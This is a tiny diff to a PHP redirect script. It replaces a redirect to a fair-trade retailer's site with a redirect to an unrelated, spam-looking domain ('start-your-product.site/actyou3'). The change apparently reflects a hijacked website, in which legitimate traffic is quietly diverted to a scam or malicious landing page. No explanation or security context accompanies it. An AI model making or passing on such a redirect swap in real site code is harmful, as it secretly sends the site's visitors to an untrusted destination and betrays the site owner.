@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.tenthousandvillages.ca/");
+header("Location: https://start-your-product.site/actyou3");
 die();
 ?>
